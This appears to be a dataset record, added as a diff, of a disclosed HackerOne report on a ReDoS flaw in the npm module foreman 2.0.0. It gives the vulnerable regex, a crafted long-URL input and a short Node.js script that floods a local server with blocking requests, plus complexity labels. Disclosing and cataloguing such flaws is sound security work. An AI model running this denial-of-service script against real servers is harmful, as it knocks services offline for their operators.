@@ -1,0 +1,38 @@
+{
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "chalker ",
+  "title": "`foreman` is vulnerable to ReDoS in path",
+  "content": "\nI would like to report ReDoS in foreman.\nIt allows to cause denial of service by suppling a crafted path.\nModule\nmodule name: foreman\nversion: 2.0.0\nnpm page: https://www.npmjs.com/package/foreman\nModule Description\nNode Foreman is a Node.js version of the popular Foreman tool, with a few Node specific changes.\nModule Stats\n5 296 downloads in the last day\n30 879 downloads in the last week\n141 342 downloads in the last month\n~1 696 104 estimated downloads per year\nVulnerability\nVulnerability Description\nReDoS.\nRegex: /http:\\/\\/[^/]*:?[0-9]*(\\/.*)$/\nEvil string: http://${Array(81000).join('0')} (unwrap js template)\nLine: https://github.com/strongloop/node-foreman/blob/v2.0.0/forward.js#L30\nBlocks for ~5 seconds per request.\nSteps To Reproduce:\nnf start -f 9999\nCode 235 Bytes\n1const net = require('net');\n2const tick = function() {\n3const client = net.createConnection({ port: 9999 }, () => {\n4  client.write(`GET http://${Array(81000).join('0')} HTTP/1.1\n5Host: localhost:9999\n6\n7\n8\"`);\n9  });\n10}\n11setInterval(tick, 1000)\nSupporting Material/References:\nOS: Arch Linux current\nNode.js 9.5.0\nnpm 5.6.0\nWrap up\nI contacted the maintainer to let him know: N\nI opened an issue in the related repository: N\nImpact\nDenial of Service by passing crafted paths.\n\n",
+  "severity": [
+    7.5,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Uncontrolled Resource Consumption"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1524961860,
+  "report_url": "https://hackerone.com/reports/320586",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Start a local server using `nf start -f 9999`"
+    ],
+    [
+      2,
+      "Run the provided Node.js script that sends crafted HTTP requests with a long string in the URL to trigger the ReDoS"
+    ]
+  ],
+  "vuln_description": "The vulnerability is a Regular Expression Denial of Service (ReDoS) in the `foreman` module. It occurs when a crafted path containing a very long string is processed by a vulnerable regular expression (`/http:\\/\\/[^/]*:?[0-9]*(\\/.*)$/`), causing the server to block for approximately 5 seconds per request.",
+  "reason": "The attack is straightforward, involving only the crafting of a specific HTTP request with a long string to exploit a known vulnerable regex pattern. There are no complex interactions or state manipulations required.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null
+}
